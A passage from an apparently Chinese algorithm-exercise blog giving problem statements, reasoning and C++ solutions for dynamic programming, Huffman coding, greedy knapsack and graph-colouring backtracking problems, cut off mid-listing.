title="题目描述"></a>题目描述</h4><p>一个特别的单行街道在每公里处有一个汽车站。顾客根据他们乘坐汽车的公里使来付费。例如下表就是一个费用的单子。没有一辆车子行驶超过10公里，一个顾客打算行驶n公里(1&lt;=n&lt;100)，它可以通过无限次的换车来完成旅程。最后要求费用最少。</p><h4 id="输入-9"><a href="#输入-9" class="headerlink" title="输入"></a>输入</h4><p>第一行十个整数分别表示行走1到10公里的费用(&lt;=500)。注意这些数并无实际的经济意义，即行驶10公里费用可能比行驶一公里少。第二行一个整数n表示，旅客的总路程数。</p><h4 id="输出-9"><a href="#输出-9" class="headerlink" title="输出"></a>输出</h4><p>仅一个整数表示最少费用。</p><h4 id="样例输入-9"><a href="#样例输入-9" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">12 21 31 40 49 58 69 79 90 101</span><br><span class="line">15</span><br></pre></td></tr></table></figure><h4 id="样例输出-9"><a href="#样例输出-9" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">147</span><br></pre></td></tr></table></figure><h4 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h4><p>动态规划，依次计算出行走<code>i</code>公里需要的最少费用。</p><p>计算行走<code>i</code>公里最少费用时，用<code>j</code>遍历<code>[1~i-1]</code>，依次比较<code>price[i]</code>和<code>price[j]+price[i-j]</code>的值，遍历完成后，<code>price[i]</code>为最少费用。</p><p>例如，<code>price[4] = min(price[4], price[1]+price[3], price[2]+price[2], price[3]+price[1])</code></p><h4 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> price[<span class="number">105</span>];</span><br><span class="line"><span class="keyword">int</span> dist;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> inf = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; price[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; dist;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">11</span>; i &lt;= dist; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        price[i] = inf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= dist; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            price[i] = <span class="built_in">min</span>(price[i], price[j] + price[i - j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; price[dist] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="求数组的最长递减子序列"><a href="#求数组的最长递减子序列" class="headerlink" title="求数组的最长递减子序列"></a>求数组的最长递减子序列</h3><h4 id="题目描述-10"><a href="#题目描述-10" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个整数序列，输出它的最长递减（注意不是“不递增”）子序列。</p><h4 id="输入-10"><a href="#输入-10" class="headerlink" title="输入"></a>输入</h4><p>输入包括两行，第一行包括一个正整数N（N&lt;=1000），表示输入的整数序列的长度。第二行包括用空格分隔开的N个整数，整数范围区间为[-30000,30000]。</p><h4 id="输出-10"><a href="#输出-10" class="headerlink" title="输出"></a>输出</h4><p>输出最长递减子序列，数字之间有一个空格。</p><h4 id="样例输入-10"><a href="#样例输入-10" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8</span><br><span class="line">9 4 3 2 5 4 3 2</span><br></pre></td></tr></table></figure><h4 id="样例输出-10"><a href="#样例输出-10" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9 5 4 3 2</span><br></pre></td></tr></table></figure><h4 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h4><p><code>dp[i]</code>存储<code>[i~n]</code>区间的最长递减子序列，双重循环从后向前遍历，内层循环从<code>[i+1~n]</code>，找出最大值小于<code>i</code>的最长递减子序列的长度；外层循环从[<code>n-2~0]</code>，将内层循环找到的最大值加一，更新所有的<code>dp[i]</code>。</p><p>输出最优解时，因为刚才是从后向前遍历的,所以所有最大递增子序列均在<code>maxpos</code>之后。遍历<code>[maxpos~n]</code>，寻找最大递减子序列的下一元素时，只需要判断其值是否小于上一元素且它的最大递减子序列是否比上一元素的小1，即可。</p><h4 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1005</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="comment">//dp[i]存储[i~end]区间的最长递减子序列</span></span><br><span class="line"><span class="keyword">int</span> dp[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, maxval = <span class="number">1</span>, maxpos = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">        dp[i] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> <span class="built_in">max</span> = <span class="number">0</span>; <span class="comment">//保存从[i+1~end]区间内的最长递减子序列</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//找出[i+1~end]区间中最大值比i小的最长递减子序列</span></span><br><span class="line">            <span class="keyword">if</span> (a[i] &gt; a[j])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">max</span> = dp[j] &gt; <span class="built_in">max</span> ? dp[j] : <span class="built_in">max</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//i的最长递减子序列=[i+1~end]区间的最长递减子序列+1</span></span><br><span class="line">        dp[i] = <span class="built_in">max</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (dp[i] &gt; maxval)</span><br><span class="line">        &#123;   </span><br><span class="line">            <span class="comment">//存储最优值</span></span><br><span class="line">            maxval = dp[i];</span><br><span class="line">            <span class="comment">//存储最优值的位置</span></span><br><span class="line">            maxpos = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; a[maxpos] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">    <span class="comment">//从后向前遍历的,因此所有最大递增子序列均在maxpos之后</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = maxpos + <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (dp[maxpos] == dp[i] + <span class="number">1</span> &amp;&amp; a[maxpos] &gt; a[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; a[i] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">            maxpos = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="贪心算法"><a href="#贪心算法" class="headerlink" title="贪心算法"></a>贪心算法</h2><h3 id="问题-B-哈夫曼编码"><a href="#问题-B-哈夫曼编码" class="headerlink" title="问题 B: 哈夫曼编码"></a>问题 B: 哈夫曼编码</h3><h4 id="题目描述-11"><a href="#题目描述-11" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一只含有小写字母的字符串；输出其哈夫曼编码的长度</p><h4 id="输入-11"><a href="#输入-11" class="headerlink" title="输入"></a>输入</h4><p>第一行一个整数T，代表样例的个数，接下来T行，每行一个字符串，0&lt;T&lt;=2000,字符串长度0&lt;L&lt;=1500.</p><h4 id="输出-11"><a href="#输出-11" class="headerlink" title="输出"></a>输出</h4><p>对于每个字符串，输出其哈夫曼编码长度</p><h4 id="样例输入-11"><a href="#样例输入-11" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">hrvsh</span><br><span class="line">lcxeasexdphiopd</span><br><span class="line">mntflolfbtbpplahqolqykrqdnwdoq</span><br></pre></td></tr></table></figure><h4 id="样例输出-11"><a href="#样例输出-11" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">51</span><br><span class="line">115</span><br></pre></td></tr></table></figure><h4 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h4><p>哈夫曼编码的思路不难，主要讲一下优先级队列的使用。</p><p>在STL里有这个priority_queue，实现优先队列的结构，在优先队列中，优先级高的元素先出队列。</p><p>模板声明(3个参数)：<code>priority_queue&lt;Type, Container, Functional&gt;</code></p><ul><li>Type 为数据类型</li><li>Container 为保存数据的容器， 必须是用数组实现的容器，比如 <code>vector</code>、 <code>deque</code> 但不能用 <code>list</code>。默认用的是 <code>vector</code></li><li>Functional 为元素比较方式，默认用 <code>operator&lt;</code> , 即队头元素最大。</li></ul><p>所以如果后面俩个参数缺省的话，优先队列就是大顶堆，队头元素最大。</p><p>如果要用到小顶堆，则一般要把模板的三个参数都带进去。STL里面定义了一个仿函数 <code>greater&lt;&gt;</code>，对于基本类型可以用这个仿函数声明小顶堆<code>priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt; &gt;q;</code>，即队头元素最小。对于自定义类型，则必须自己重载 <code>operator&lt;</code> 或者自己写比较函数。</p><p>优先级队列的几个操作：</p><ul><li><p><code>empty()</code> 如果优先队列为空，则返回真</p></li><li><p><code>pop()</code> 删除第一个元素</p></li><li><p><code>push()</code> 插入一个元素</p></li><li><p><code>size()</code> 返回优先队列中拥有的元素的个数</p></li><li><p>top() 返回优先队列中有最高优先级的元素</p></li></ul>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">  <span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; T;</span><br><span class="line">    <span class="keyword">while</span> (T--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> s[<span class="number">1505</span>];</span><br><span class="line">        <span class="comment">//存放每个字母的频率</span></span><br><span class="line">        <span class="keyword">int</span> n[<span class="number">26</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            n[s[i] - <span class="string">'a'</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//建立一个优先级队列</span></span><br><span class="line">        priority_queue&lt;<span class="keyword">int</span>, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;, greater&lt;<span class="keyword">int</span>&gt;&gt; q;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (n[i] &gt; <span class="number">0</span>)</span><br><span class="line">                q.push(n[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//不断更新优先级队列</span></span><br><span class="line">        <span class="keyword">while</span> (q.<span class="built_in">size</span>() &gt;= <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> a = q.top();</span><br><span class="line">            q.pop();</span><br><span class="line">            <span class="keyword">int</span> b = q.top();</span><br><span class="line">            q.pop();</span><br><span class="line">            <span class="keyword">int</span> temp = a + b;</span><br><span class="line">            q.push(temp);</span><br><span class="line">            sum += temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; sum &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="问题-D-Homework"><a href="#问题-D-Homework" class="headerlink" title="问题 D: Homework"></a>问题 D: Homework</h3><h4 id="题目描述-12"><a href="#题目描述-12" class="headerlink" title="题目描述"></a>题目描述</h4><p>临近开学了，大家都忙着收拾行李准 备返校，但 I_Love_C 却不为此担心! 因为他的心思全在暑假作业上：目前为止还未开动。</p><p>暑假作业是很多张试卷，我们这些从试卷里爬出来的人都知道，卷子上的题目有选择题、填空题、简答题、证明题等。而做选择题的好处就在于工作量很少，但又因为选择题题目都普遍很长。如果有 5 张试卷，其中 4 张是选择题，最后一张是填空题，很明显做最后一张所花的时间要比前 4 张长很多。但如果你只做了选择题，虽然工作量很少，但表面上看起来也已经做了4/5的作业了。</p><p>I_Love_C决定就用这样的方法来蒙混过关，他统计出了做完每一张试卷所需的时间以及它做完后能得到的价值（按上面的原理，选择题越多价值当然就越高咯）。</p><p>现在就请你帮他安排一下，用他仅剩的一点时间来做最有价值的作业。</p><h4 id="输入-12"><a href="#输入-12" class="headerlink" title="输入"></a>输入</h4><p>测试数据包括多组。每组测试数据以两个整数 M,N(1&lt;M&lt;20,1&lt;N&lt;10000) 开头，分别表示试卷的数目和 I_Love_C 剩下的时间。接下来有 M 行，每行包括两个整数 T,V(1&lt;T&lt;N,1&lt;V&lt;10000)分别表示做完这张试卷所需的时间以及做完后能得到的价值，输入以 0 0 结束。</p><h4 id="输出-12"><a href="#输出-12" class="headerlink" title="输出"></a>输出</h4><p>对应每组测试数据输出 I_Love_C 能获得的最大价值。保留小数点 2 位</p><p>提示：float 的精度可能不够，你应该使用 double 类型。</p><h4 id="样例输入-12"><a href="#样例输入-12" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">4 20</span><br><span class="line">4 10</span><br><span class="line">5 22</span><br><span class="line">10 3</span><br><span class="line">1 2</span><br><span class="line">0 0</span><br></pre></td></tr></table></figure><h4 id="样例输出-12"><a href="#样例输出-12" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">37.00</span><br></pre></td></tr></table></figure><h4 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h4><p>背包类的贪心算法，计算物品性价比，按性价比从大到小排序，优先装入性价比大的，直到容量满为止。</p><h4 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">25</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">paper</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">double</span> t, v;</span><br><span class="line">    <span class="keyword">double</span> cost; <span class="comment">//性价比</span></span><br><span class="line">&#125; paper[maxn];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(struct paper a, struct paper b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.cost &gt; b.cost;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, c;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n &gt;&gt; c)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span> &amp;&amp; c == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; paper[i].t &gt;&gt; paper[i].v;</span><br><span class="line">            <span class="comment">//计算每张试卷的性价比</span></span><br><span class="line">            paper[i].cost = paper[i].v / paper[i].t;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//按性价比排序</span></span><br><span class="line">        sort(paper, paper + n, cmp);</span><br><span class="line">        <span class="keyword">double</span> <span class="built_in">max</span> = <span class="number">0</span>, time = c;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (paper[i].t &lt;= time)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">max</span> += paper[i].v;</span><br><span class="line">                time -= paper[i].t;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//得到部分价值(时间*性价比)</span></span><br><span class="line">                <span class="built_in">max</span> += time * paper[i].cost;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//printf("%.2f\n", max);</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; setiosflags(ios::fixed) &lt;&lt; setprecision(<span class="number">2</span>) &lt;&lt; <span class="built_in">max</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h2><h3 id="图的m着色问题"><a href="#图的m着色问题" class="headerlink" title="图的m着色问题"></a>图的m着色问题</h3><h4 id="题目描述-13"><a href="#题目描述-13" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定无向连通图G和m种不同的颜色，用这些颜色给图的各个顶点着一种颜色，若某种方案使得图中每条边的2个顶点的颜色都不相同，则是一个满足的方案，找出所有的方案。</p><h4 id="输入-13"><a href="#输入-13" class="headerlink" title="输入"></a>输入</h4><p>第一行有3个正整数n，k和m，分别表示n个顶点，k条边，m种颜色<br>接下来k行，每行2个正整数，表示一条边的两个顶点</p><h4 id="输出-13"><a href="#输出-13" class="headerlink" title="输出"></a>输出</h4><p>所有不同的着色方案数</p><h4 id="样例输入-13"><a href="#样例输入-13" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">5 8 4 </span><br><span class="line">1 2</span><br><span class="line">1 3 </span><br><span class="line">1 4</span><br><span class="line">2 3</span><br><span class="line">2 4</span><br><span class="line">2 5</span><br><span class="line">3 4</span><br><span class="line">4 5</span><br></pre></td></tr></table></figure><h4 id="样例输出-13"><a href="#样例输出-13" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">48</span><br></pre></td></tr></table></figure><h4 id="代码-10"><a href="#代码-10" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">2e3</span> + <span class="number">5</span>;</span><br><span class="line"><span class="comment">//n个顶点，k条边，m种颜色</span></span><br><span class="line"><span class="keyword">int</span> n, k, m, res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">map</span>[maxn][maxn];</span><br><span class="line"><span class="keyword">int</span> color[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (d == n + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        res++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//m种颜色</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//深度优先,若相邻且有子节点同样上了i颜色,则剪去</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">map</span>[d][j] == <span class="number">1</span> &amp;&amp; color[j] == i)</span><br><span class="line">            &#123;</span><br><span class="line">                flag = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="number">1</span>) <span class="comment">//可行</span></span><br><span class="line">        &#123;</span><br><span class="line">            color[d] = i; <span class="comment">//上色</span></span><br><span class="line">            dfs(d + <span class="number">1</span>);   <span class="comment">//递归下一节点</span></span><br><span class="line">            color[d] = <span class="number">0</span>; <span class="comment">//恢复颜色</span></span><br><span class="line">        